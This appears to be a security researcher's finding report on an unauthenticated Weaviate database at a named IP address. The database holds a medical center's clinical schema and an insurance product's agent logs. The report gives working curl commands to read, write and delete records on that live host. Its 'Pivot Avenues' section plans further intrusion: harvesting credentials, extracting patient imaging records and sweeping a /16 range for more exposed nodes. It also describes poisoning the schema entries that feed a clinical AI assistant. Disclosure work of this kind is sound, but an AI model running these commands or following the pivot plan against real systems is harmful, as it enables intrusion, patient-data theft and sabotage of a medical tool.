# FCE STA. ISABEL / Verto Inspect -- Unauth RWD on Weaviate (147.93.180.34:8080)
**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---
## Target

| Field | Value |
|-------|-------|
| IP | 147.93.180.34 |
| Port | 8080 |
| Service | Weaviate 1.27.9 |
| Hosting | Contabo GmbH, Germany |
| Auth | NONE |

Two distinct tenants colocated on a single unprotected node.

---
## Operator Attribution

**Operator A: FCE STA. ISABEL**
- Medical center, name derived from class prefix `FCE_` and schema object descriptions in Spanish
- "STA. ISABEL" appears in schema object names and stored procedure metadata
- Likely Peru or Colombia based on Spanish clinical naming conventions
- Clinical AI system vectorizing the full production database schema for query assistance

**Operator B: Verto Inspect**
- Insurance inspection software product, name appears in agent conversation content
- Agent approvals signed by "Juan"
- Multi-agent development system (ProductOwner / ScrumMaster / AgentDB roles)
- Pre-release; no public web presence confirmed at time of finding

Evidence basis: class names, schema object descriptions, and agent content fields -- no external lookup required.

---
## Data

### Classes

| Class | Object Count | Description |
|-------|-------------|-------------|
| DB_Schema | confirmed populated | Full relational schema of FCE STA. ISABEL clinical database |
| Academico | populated | Academic book/chapter content (libro, autor, area) |
| RAG_Academico | populated | Academic RAG chunks |
| RAG_Academico2 | populated | Academic RAG chunks, second corpus |
| ProjectArchive | populated | Verto Inspect multi-agent conversation logs |

### DB_Schema -- Properties

| Property | Type | Notes |
|----------|------|-------|
| context_database_id | text | Database identifier |
| object_id | text | Schema object ID |
| object_name | text | Table/procedure name |
| object_type | text | TABLE, VIEW, PROCEDURE, etc. |
| schema_name | text | Schema namespace |
| description | text | Full Spanish-language column/object description |
| texto_embedding | text | Raw text fed to embedding model |
| columns_text | text | Column definitions |

### DB_Schema -- Sample Records

| object_name | object_type | Summary |
|-------------|-------------|---------|
| FCE_PACIENTE_EXAMEN_IMAGENOLOGIA | TABLE | Patient radiology/imaging records (PACIENTE_ID, EXAMEN_ID, FECHA, DIAGNOSTICO_ID, ARCHIVO_ID, visto) |
| FCE_ESPECIALISTA_AREA | TABLE | Doctor-to-specialty assignments |
| FCE_ATENCION_EXAMEN_FISICO_Select | PROCEDURE | Stored procedure: patient physical examination records per medical appointment |

All schema objects include full Spanish-language descriptions of each column's clinical purpose.

### ProjectArchive -- Properties

| Property | Type | Notes |
|----------|------|-------|
| projectId | text | Project identifier |
| phaseId | text | Sprint/phase |
| agentType | text | ProductOwner, ScrumMaster, AgentDB |
| messageType | text | deliverable, discussion, etc. |
| content | text | Full agent output text |
| approvedBy | text | "Juan" |
| createdAt | datetime | Timestamp |
| sqlRefId | text | SQL reference ID |

Sample content: sprint planning outputs, BDD user story criteria, database schema design decisions for insurance claim management workflows.

---
## Access Matrix

| Operation | Result | HTTP Status |
|-----------|--------|-------------|
| GET /v1/schema | Schema enumeration | 200 OK |
| GET /v1/objects?class=DB_Schema | Record read | 200 OK |
| GET /v1/objects?class=ProjectArchive | Record read | 200 OK |
| POST /v1/objects (DB_Schema) | Write canary object | 200 OK |
| DELETE /v1/objects/DB_Schema/{uuid} | Delete canary | 204 No Content |
| GET /v1/objects/DB_Schema/{uuid} | Verify deletion | 404 Not Found |

**Canary UUID:** `90a88cf5-29f6-426a-b035-cc2a19f0d2b1`
Written to class `DB_Schema`. Write confirmed 200, delete confirmed 204, post-delete verify confirmed 404.

---
## PoC

### Read -- Schema Enumeration
```bash
curl -s http://147.93.180.34:8080/v1/schema | jq '.classes[].class'
```

### Read -- Patient Schema Records
```bash
curl -s "http://147.93.180.34:8080/v1/objects?class=DB_Schema&limit=10" \
  | jq '.objects[] | {name: .properties.object_name, type: .properties.object_type, desc: .properties.description}'
```

### Read -- Verto Inspect Agent Logs
```bash
curl -s "http://147.93.180.34:8080/v1/objects?class=ProjectArchive&limit=10" \
  | jq '.objects[] | {agent: .properties.agentType, type: .properties.messageType, content: .properties.content[:200]}'
```

### Write -- Canary Injection
```bash
curl -s -X POST http://147.93.180.34:8080/v1/objects \
  -H "Content-Type: application/json" \
  -d '{
    "class": "DB_Schema",
    "id": "90a88cf5-29f6-426a-b035-cc2a19f0d2b1",
    "properties": {
      "object_name": "CANARY_nuclide_2026_06_20",
      "object_type": "CANARY",
      "description": "Security research canary -- nuclide-research.com"
    }
  }' | jq '.id'
```

### Delete -- Canary Removal
```bash
curl -s -X DELETE \
  "http://147.93.180.34:8080/v1/objects/DB_Schema/90a88cf5-29f6-426a-b035-cc2a19f0d2b1" \
  -w "%{http_code}"
# Expected: 204
```

### Verify -- Deletion Confirmed
```bash
curl -s -o /dev/null -w "%{http_code}" \
  "http://147.93.180.34:8080/v1/objects/DB_Schema/90a88cf5-29f6-426a-b035-cc2a19f0d2b1"
# Expected: 404
```

---
## Impact

### Healthcare Schema Exposure
The full relational schema of FCE STA. ISABEL's clinical database is vectorized and readable without authentication. An attacker retrieves exact table names, column definitions, foreign key relationships, and stored procedure logic for patient radiology records, physical examination appointments, and doctor-specialty assignments. This is the attack blueprint for the production database -- any exposed or laterally reachable DB instance becomes trivially queryable with zero reconnaissance needed.

### Regulatory
Schema exposure of a healthcare operator's clinical database triggers obligations under local health data protection law (Peru: Ley 29733; Colombia: Ley 1581) and potentially GDPR if any EU nationals are treated. The exposed objects include patient-identifier columns (`PACIENTE_ID`) sufficient to confirm the scope of underlying patient data. FCE = Centro de Fisioterapia y Especialidades -- a physiotherapy and specialty medical center.

### AI Knowledge Base Poisoning
Write access to `DB_Schema` allows injection of false schema descriptions. Clinical staff using the AI query assistant receive incorrect table/column guidance. In a medical context, a poisoned schema entry pointing clinical queries to the wrong table or stored procedure is a patient safety issue, not only a data integrity issue.

### Verto Inspect IP Theft
Agent-to-agent conversation logs in `ProjectArchive` expose the full system architecture, BDD user story requirements, database schema decisions, and sprint planning outputs for an unreleased insurance inspection product. A competitor or malicious actor retrieves the complete product specification at zero cost.

---
## Pivot Avenues

1. FCE STA. ISABEL web presence -- search for the medical center's public domain to identify the production database server's network neighborhood and potential direct DB exposure
2. `context_database_id` field -- scroll all DB_Schema records; may contain connection strings, database names, or server hostnames pointing to the production clinical DB
3. `PACIENTE_ID` column -- confirms a patient records table exists in production; combined with any production DB exposure on the same network, provides the exact query to extract patient imaging records
4. ProjectArchive full scroll -- Verto Inspect agent logs with `messageType: deliverable` may contain API keys, database credentials, or deployment environment details in later sprint phases
5. Contabo neighborhood -- 147.93.0.0/16 -- sweep for additional Weaviate instances colocated in the same Contabo allocation; operators who expose one node commonly expose siblings
6. Academico classes -- academic RAG corpus may belong to a third operator or reveal the institutional context (university affiliation) that ties back to FCE STA. ISABEL's parent organization

---
## Tool Reference

**weavscan** -- https://github.com/nuclide-research/weavscan

Weaviate schema enumeration and unauth access prober. Outputs class list, object counts, property schemas, and sample records. Canary write/delete cycle confirms RWD without credentials.
